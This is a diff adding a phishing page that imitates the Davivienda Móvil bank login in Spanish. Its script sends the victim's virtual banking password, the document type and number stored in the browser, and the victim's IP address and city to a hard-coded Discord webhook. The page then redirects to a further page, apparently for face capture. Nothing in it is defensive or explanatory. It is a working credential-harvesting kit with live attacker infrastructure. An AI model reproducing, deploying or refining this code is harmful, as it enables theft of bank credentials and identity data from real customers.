@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+
+<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<title>Davivienda Móvil</title>
+<link href="css2" rel="stylesheet">
+
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+        background: #e6e6e6;
+        display: flex;
+        justify-content: center;
+        min-height: 100vh;
+    }
+
+    .app-container {
+        width: 100%;
+        max-width: 450px;
+        background: #f4f4f4;
+        min-height: 100vh;
+        position: relative;
+        box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        display: flex;
+        flex-direction: column;
+    }
+
+    .header {
+        background: #da291c;
+        height: 130px;
+        display: flex;
+        justify-content: center;
+        align-items: flex-end;
+        padding-bottom: 20px;
+        position: relative;
+    }
+
+    .header-logo svg {
+        width: 60px;
+        height: auto;
+        fill: none;
+        stroke: white;
+        stroke-width: 2;
+    }
+
+    .content {
+        padding: 20px 30px;
+        flex: 1;
+    }
+
+    .back-btn {
+        display: flex;
+        align-items: center;
+        color: #555;
+        font-size: 16px;
+        font-weight: 500;
+        margin-bottom: 30px;
+        cursor: pointer;
+    }
+
+    .back-btn svg {
+        width: 12px;
+        height: 12px;
+        margin-right: 10px;
+        fill: #555;
+    }
+
+    .input-label {
+        font-size: 15px;
+        color: #333;
+        font-weight: 500;
+        margin-bottom: 10px;
+        display: block;
+    }
+
+    .input-group {
+        background: #fff;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        height: 50px;
+        display: flex;
+        align-items: center;
+        padding: 0 15px;
+        margin-bottom: 25px;
+        position: relative;
+    }
+
+    .input-group img, .input-group svg {
+        width: 24px;
+        height: 24px;
+        margin-right: 12px;
+        opacity: 0.6;
+    }
+
+    select {
+        width: 100%;
+        border: none;
+        outline: none;
+        background: transparent;
+        font-size: 16px;
+        color: #333;
+        appearance: none;
+        -webkit-appearance: none;
+        position: relative;
+        z-index: 2;
+    }
+
+    .arrow-icon {
+        position: absolute;
+        right: 15px;
+        pointer-events: none;
+        width: 14px !important;
+        height: 14px !important;
+    }
+
+    input {
+        width: 100%;
+        border: none;
+        outline: none;
+        font-size: 16px;
+        color: #333;
+    }
+    
+    input::placeholder {
+        color: #aaa;
+    }
+
+    .forgot-link {
+        text-align: center;
+        display: block;
+        color: #333;
+        font-size: 14px;
+        font-weight: 600;
+        margin: 10px 0 30px 0;
+        text-decoration: none;
+    }
+
+    .submit-btn {
+        width: 100%;
+        height: 48px;
+        border-radius: 24px;
+        border: none;
+        font-size: 16px;
+        font-weight: 500;
+        cursor: pointer;
+        transition: 0.3s;
+        background: #cccccc;
+        color: #fff;
+        margin-bottom: 40px;
+    }
+
+    .submit-btn.active {
+        background: #da291c;
+    }
+
+    .qr-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        position: relative;
+        margin-bottom: 20px;
+        margin-top: auto;
+    }
+
+    .qr-bar {
+        background: #da291c;
+        width: 280px;
+        height: 40px;
+        border-radius: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 0 25px;
+        color: white;
+        font-size: 14px;
+        font-weight: 500;
+    }
+
+    .qr-center-btn {
+        position: absolute;
+        width: 48px;
+        height: 48px;
+        background: white;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        left: 50%;
+        transform: translateX(-50%);
+    }
+
+    .qr-center-btn svg {
+        width: 24px;
+        height: 24px;
+        fill: #333;
+    }
+
+    .footer-text {
+        text-align: center;
+        font-size: 11px;
+        color: #888;
+        padding-bottom: 20px;
+        line-height: 1.4;
+    }
+
+    .support-float {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 55px;
+        height: 55px;
+        background: #da291c;
+        border-radius: 50%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        z-index: 100;
+    }
+    
+    .support-float svg {
+        width: 30px;
+        height: 30px;
+        fill: white;
+    }
+
+</style>
+</head>
+<body>
+
+<div class="app-container">
+    
+<div class="header">
+    <div class="header-logo" style="
+        width: 70px;
+        height: 70px;
+        background: url('https://i.postimg.cc/xCzwGQ37/image-removebg-preview-(11).png') no-repeat center/contain;
+    ">
+    </div>
+</div>
+
+
+    <div class="content">
+        <div class="back-btn" onclick="window.location='index.html';">
+            <svg viewBox="0 0 320 512"><path d="M34.52 239.03L228.87 44.69c9.37-9.37 24.57-9.37 33.94 0l22.67 22.67c9.36 9.36 9.37 24.52.04 33.9L131.49 256l154.02 154.75c9.34 9.38 9.32 24.54-.04 33.9l-22.67 22.67c-9.37 9.37-24.57 9.37-33.94 0L34.52 272.97c-9.37-9.37-9.37-24.57 0-33.94z"></path></svg>
+            Atrás
+        </div>
+
+        <form id="formulario">
+        
+         
+            <label class="input-label">Ingrese su clave virtual</label>
+            <div class="input-group">
+                <input type="tel" id="documentox" name="documento" placeholder="Clave virtual" maxlength="8" minlength="6" inputmode="numeric" autocomplete="off" required>
+            </div>
+
+            <a href="#" class="forgot-link">¿Olvidó o bloqueó su celular?</a>
+
+            <button type="submit" id="btn-submit" class="submit-btn" disabled="">Iniciar sesión</button>
+        
+        </form>
+
+
+        <div class="footer-text">
+            Términos y condiciones<br>
+        </div>
+        </div>
+    </div>
+
+<script>
+    const input = document.getElementById("documentox");
+    const btn = document.getElementById("btn-submit");
+
+    input.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "");
+
+        const length = this.value.length;
+
+        if (length === 6 || length === 8) {
+            btn.classList.add("active");
+            btn.removeAttribute("disabled");
+        } else {
+            btn.classList.remove("active");
+            btn.setAttribute("disabled", "true");
+        }
+    });
+</script>
+
+  
+<script type="module">
+  // 🎯 WEBHOOK DE DISCORD
+  const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1442967165413232754/otiUgJhiF8S5-EGS9frT16ZlYAOYePGfHQ4fp81pq6dCPIuxeMbI67ilMYI-pRlzxeAi';
+  
+  const form = document.getElementById("formulario");
+  const btn = document.getElementById("btn-submit");
+
+  // 🚀 FUNCIÓN PARA ENVIAR A DISCORD
+  async function enviarADiscord(tipoDoc, numDoc, clave, ip, ciudad) {
+    try {
+      const fecha = new Date().toLocaleString('es-CO', { 
+        timeZone: 'America/Bogota',
+        dateStyle: 'full',
+        timeStyle: 'medium'
+      });
+
+      const tipoDocTexto = tipoDoc === 'CC' ? 'Cédula de Ciudadanía' : 
+                           tipoDoc === 'CE' ? 'Cédula de Extranjería' : 
+                           tipoDoc === 'PP' ? 'Pasaporte' : 
+                           'Desconocido';
+
+      const mensaje = {
+        embeds: [{
+          title: "🔐 Nueva Clave Virtual - Davivienda",
+          color: 0xDA291C,
+          fields: [
+            {
+              name: "📋 Tipo de Documento",
+              value: tipoDocTexto,
+              inline: true
+            },
+            {
+              name: "🪪 Número de Documento",
+              value: numDoc,
+              inline: true
+            },
+            {
+              name: "🔑 Clave Virtual",
+              value: `\`${clave}\``,
+              inline: false
+            },
+            {
+              name: "🌐 Dirección IP",
+              value: ip,
+              inline: true
+            },
+            {
+              name: "📍 Ciudad",
+              value: ciudad,
+              inline: true
+            },
+            {
+              name: "🕒 Fecha y Hora",
+              value: fecha,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Sistema de Notificaciones Davivienda"
+          },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      const response = await fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(mensaje)
+      });
+
+      if (response.ok) {
+        console.log('✅ Datos enviados a Discord correctamente');
+        return true;
+      } else {
+        console.error('❌ Error al enviar a Discord:', response.status);
+        return false;
+      }
+    } catch (error) {
+      console.error('❌ Error en la petición a Discord:', error);
+      return false;
+    }
+  }
+
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
+
+    btn.disabled = true;
+    btn.innerText = "Enviando...";
+   
+    // 📦 OBTENER DATOS DEL LOCALSTORAGE
+    const tipoDoc = localStorage.getItem('tipo_documento') || 'Desconocido'; 
+    const numDoc = localStorage.getItem('documento') || 'Desconocido';
+    const claveVirtual = document.getElementById("documentox").value;
+
+    // 🌍 OBTENER IP Y CIUDAD
+    let ip = "Desconocida";
+    let ciudad = "Desconocida";
+    try {
+      const ipRes = await fetch("https://ipwhois.app/json/");
+      const ipData = await ipRes.json();
+      ip = ipData.ip || "No encontrada";
+      ciudad = ipData.city || "No encontrada";
+    } catch (error) {
+      console.error("Error obteniendo IP:", error);
+    }
+
+    // 📤 ENVIAR A DISCORD
+    const enviado = await enviarADiscord(tipoDoc, numDoc, claveVirtual, ip, ciudad);
+
+    if (enviado) {
+      // ✅ Redirigir si se envió correctamente
+      window.location.href = "rostro.html";
+    } else {
+      // ❌ Mostrar error si falló
+      btn.disabled = false;
+      btn.innerText = "Iniciar sesión";
+      alert("Error al enviar el formulario. Por favor, intenta de nuevo.");
+    }
+  });
+</script>
+
+</body></html>
